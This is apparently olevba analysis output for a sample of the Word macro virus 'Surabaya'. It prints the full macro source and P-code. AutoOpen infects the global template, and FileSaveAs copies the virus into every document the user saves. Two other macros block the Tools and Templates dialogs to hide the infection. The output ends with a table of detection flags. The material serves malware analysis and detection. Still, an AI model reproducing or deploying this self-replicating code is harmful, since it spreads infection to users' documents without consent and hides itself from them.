olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Surabaya
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Surabaya - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileTemplates.bas 
in file: Virus.MSWord.Surabaya - OLE stream: 'Macros/VBA/FileTemplates'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
On Error GoTo -1: On Error GoTo wis
WordBasic.MsgBox "Sorry..."
wis:
End Sub
-------------------------------------------------------------------------------
VBA MACRO ToolsMacro.bas 
in file: Virus.MSWord.Surabaya - OLE stream: 'Macros/VBA/ToolsMacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
On Error GoTo -1: On Error GoTo wis
WordBasic.MsgBox "Sorry..."
wis:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: Virus.MSWord.Surabaya - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim sme$
Dim yesmacro$
Dim ExecuteOnly
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error GoTo -1: On Error GoTo susah
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
sme$ = WordBasic.[FileName$]()
yesmacro$ = sme$ + ":AutoOpen"
WordBasic.MacroCopy "Global:AutoOpen", yesmacro$, ExecuteOnly
yesmacro$ = sme$ + ":FileSaveAs"
WordBasic.MacroCopy "Global:FileSaveAs", yesmacro$, ExecuteOnly
yesmacro$ = sme$ + ":Autoexec"
WordBasic.MacroCopy "Global:Autoexec", yesmacro$, ExecuteOnly
yesmacro$ = sme$ + ":ToolsMacro"
WordBasic.MacroCopy "Global:ToolsMacro", yesmacro$, ExecuteOnly
yesmacro$ = sme$ + ":FileTemplates"
WordBasic.MacroCopy "Global:FileTemplates", yesmacro$, ExecuteOnly
yesmacro$ = sme$ + ":Plong"
WordBasic.MacroCopy "Global:Plong", yesmacro$, ExecuteOnly
WordBasic.FileSaveAs dlg
GoTo selesai

susah:
If Err.Number <> 102 Then
        WordBasic.FileSaveAs dlg
End If
selesai:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Surabaya - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim HitungM
Dim i
Dim Yesinstall
Dim mom$
Dim sMacro$
Dim ExecuteOnly
On Error GoTo -1: On Error GoTo Abort
HitungM = WordBasic.CountMacros(0, 0)
For i = 1 To HitungM
    If WordBasic.[MacroName$](i, 0, 0) = "Plong" Then
        Yesinstall = -1
    End If
Next i

If Not Yesinstall Then
    WordBasic.SetProfileString "Author", "Name", "TeBeYe`93 The ICE-Man"
    mom$ = WordBasic.[FileName$]()
    sMacro$ = mom$ + ":FileSaveAs"
    WordBasic.MacroCopy sMacro$, "Global:FileSaveAs", ExecuteOnly
    sMacro$ = mom$ + ":AutoOpen"
    WordBasic.MacroCopy sMacro$, "Global:AutoOpen", ExecuteOnly
    sMacro$ = mom$ + ":Autoexec"
    WordBasic.MacroCopy sMacro$, "Global:Autoexec", ExecuteOnly
    sMacro$ = mom$ + ":ToolsMacro"
    WordBasic.MacroCopy sMacro$, "Global:ToolsMacro", ExecuteOnly
    sMacro$ = mom$ + ":FileTemplates"
    WordBasic.MacroCopy sMacro$, "Global:FileTemplates", ExecuteOnly
    sMacro$ = mom$ + ":Plong"
    WordBasic.MacroCopy sMacro$, "Global:Plong", ExecuteOnly
End If

Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO Autoexec.bas 
in file: Virus.MSWord.Surabaya - OLE stream: 'Macros/VBA/Autoexec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Dim hitung
Public Sub MAIN()
Dim pesan$
Dim i
Dim j
Dim k
hitung = 0
On Error GoTo -1: On Error GoTo no
pesan$ = " Lontong Micro Device (c) 1993 By ICE-Man "

For i = 1 To Len(pesan$)
        WordBasic.MsgBox WordBasic.[Right$](pesan$, i), -1
        For j = 1 To 50
        Next j
Next i

For j = 1 To 200
Next j

For k = 1 To Len(pesan$)
        WordBasic.MsgBox WordBasic.[Right$](pesan$, (Len(pesan$) - k)), -1
        For j = 1 To 50
        Next j
Next k
no:
End Sub
-------------------------------------------------------------------------------
VBA MACRO Plong.bas 
in file: Virus.MSWord.Surabaya - OLE stream: 'Macros/VBA/Plong'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Rem This Macro was created by : The ICE - "Yes"  Man
Rem
Rem         Allah Swt always be with All of You ....
Rem
Rem                             Surabaya, 09-09-1996
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Surabaya
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/FileTemplates - 972 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError wis 
' Line #3:
' 	LitStr 0x0008 "Sorry..."
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0001 
' Line #4:
' 	Label wis 
' Line #5:
' 	EndSub 
' Macros/VBA/ToolsMacro - 969 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError wis 
' Line #3:
' 	LitStr 0x0008 "Sorry..."
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0001 
' Line #4:
' 	Label wis 
' Line #5:
' 	EndSub 
' Macros/VBA/FileSaveAs - 2319 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn sme
' Line #3:
' 	Dim 
' 	VarDefn yesmacro
' Line #4:
' 	Dim 
' 	VarDefn ExecuteOnly
' Line #5:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #6:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError susah 
' Line #7:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #8:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #9:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' 	EndIf 
' Line #10:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St sme$ 
' Line #11:
' 	Ld sme$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St yesmacro$ 
' Line #12:
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld yesmacro$ 
' 	Ld ExecuteOnly 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #13:
' 	Ld sme$ 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	St yesmacro$ 
' Line #14:
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld yesmacro$ 
' 	Ld ExecuteOnly 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #15:
' 	Ld sme$ 
' 	LitStr 0x0009 ":Autoexec"
' 	Add 
' 	St yesmacro$ 
' Line #16:
' 	LitStr 0x000F "Global:Autoexec"
' 	Ld yesmacro$ 
' 	Ld ExecuteOnly 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #17:
' 	Ld sme$ 
' 	LitStr 0x000B ":ToolsMacro"
' 	Add 
' 	St yesmacro$ 
' Line #18:
' 	LitStr 0x0011 "Global:ToolsMacro"
' 	Ld yesmacro$ 
' 	Ld ExecuteOnly 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #19:
' 	Ld sme$ 
' 	LitStr 0x000E ":FileTemplates"
' 	Add 
' 	St yesmacro$ 
' Line #20:
' 	LitStr 0x0014 "Global:FileTemplates"
' 	Ld yesmacro$ 
' 	Ld ExecuteOnly 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #21:
' 	Ld sme$ 
' 	LitStr 0x0006 ":Plong"
' 	Add 
' 	St yesmacro$ 
' Line #22:
' 	LitStr 0x000C "Global:Plong"
' 	Ld yesmacro$ 
' 	Ld ExecuteOnly 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #23:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #24:
' 	GoTo selesai 
' Line #25:
' Line #26:
' 	Label susah 
' Line #27:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x0066 
' 	Ne 
' 	IfBlock 
' Line #28:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	Label selesai 
' Line #31:
' 	EndSub 
' Macros/VBA/AutoOpen - 2466 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn HitungM
' Line #3:
' 	Dim 
' 	VarDefn i
' Line #4:
' 	Dim 
' 	VarDefn Yesinstall
' Line #5:
' 	Dim 
' 	VarDefn mom
' Line #6:
' 	Dim 
' 	VarDefn sMacro
' Line #7:
' 	Dim 
' 	VarDefn ExecuteOnly
' Line #8:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Abort 
' Line #9:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	St HitungM 
' Line #10:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld HitungM 
' 	For 
' Line #11:
' 	Ld i 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	LitStr 0x0005 "Plong"
' 	Eq 
' 	IfBlock 
' Line #12:
' 	LitDI2 0x0001 
' 	UMi 
' 	St Yesinstall 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #15:
' Line #16:
' 	Ld Yesinstall 
' 	Not 
' 	IfBlock 
' Line #17:
' 	LitStr 0x0006 "Author"
' 	LitStr 0x0004 "Name"
' 	LitStr 0x0015 "TeBeYe`93 The ICE-Man"
' 	Ld WordBasic 
' 	ArgsMemCall SetProfileString 0x0003 
' Line #18:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St mom$ 
' Line #19:
' 	Ld mom$ 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	St sMacro$ 
' Line #20:
' 	Ld sMacro$ 
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld ExecuteOnly 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #21:
' 	Ld mom$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St sMacro$ 
' Line #22:
' 	Ld sMacro$ 
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld ExecuteOnly 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #23:
' 	Ld mom$ 
' 	LitStr 0x0009 ":Autoexec"
' 	Add 
' 	St sMacro$ 
' Line #24:
' 	Ld sMacro$ 
' 	LitStr 0x000F "Global:Autoexec"
' 	Ld ExecuteOnly 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #25:
' 	Ld mom$ 
' 	LitStr 0x000B ":ToolsMacro"
' 	Add 
' 	St sMacro$ 
' Line #26:
' 	Ld sMacro$ 
' 	LitStr 0x0011 "Global:ToolsMacro"
' 	Ld ExecuteOnly 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #27:
' 	Ld mom$ 
' 	LitStr 0x000E ":FileTemplates"
' 	Add 
' 	St sMacro$ 
' Line #28:
' 	Ld sMacro$ 
' 	LitStr 0x0014 "Global:FileTemplates"
' 	Ld ExecuteOnly 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #29:
' 	Ld mom$ 
' 	LitStr 0x0006 ":Plong"
' 	Add 
' 	St sMacro$ 
' Line #30:
' 	Ld sMacro$ 
' 	LitStr 0x000C "Global:Plong"
' 	Ld ExecuteOnly 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #31:
' 	EndIfBlock 
' Line #32:
' Line #33:
' 	Label Abort 
' Line #34:
' 	EndSub 
' Macros/VBA/Autoexec - 1887 bytes
' Line #0:
' Line #1:
' 	Dim 
' 	VarDefn hitung
' Line #2:
' 	FuncDefn (Public Sub MAIN())
' Line #3:
' 	Dim 
' 	VarDefn pesan
' Line #4:
' 	Dim 
' 	VarDefn i
' Line #5:
' 	Dim 
' 	VarDefn j
' Line #6:
' 	Dim 
' 	VarDefn k
' Line #7:
' 	LitDI2 0x0000 
' 	St hitung 
' Line #8:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError no 
' Line #9:
' 	LitStr 0x002A " Lontong Micro Device (c) 1993 By ICE-Man "
' 	St pesan$ 
' Line #10:
' Line #11:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld pesan$ 
' 	FnLen 
' 	For 
' Line #12:
' 	Ld pesan$ 
' 	Ld i 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0002 
' Line #13:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0032 
' 	For 
' Line #14:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #15:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #16:
' Line #17:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x00C8 
' 	For 
' Line #18:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #19:
' Line #20:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld pesan$ 
' 	FnLen 
' 	For 
' Line #21:
' 	Ld pesan$ 
' 	Ld pesan$ 
' 	FnLen 
' 	Ld k 
' 	Sub 
' 	Paren 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0002 
' Line #22:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0032 
' 	For 
' Line #23:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #24:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	NextVar 
' Line #25:
' 	Label no 
' Line #26:
' 	EndSub 
' Macros/VBA/Plong - 1194 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Rem 0x0031 " This Macro was created by : The ICE - "Yes"  Man"
' Line #3:
' 	Rem 0x0000 ""
' Line #4:
' 	Rem 0x0031 "         Allah Swt always be with All of You ...."
' Line #5:
' 	Rem 0x0000 ""
' Line #6:
' 	Rem 0x0031 "                             Surabaya, 09-09-1996"
' Line #7:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

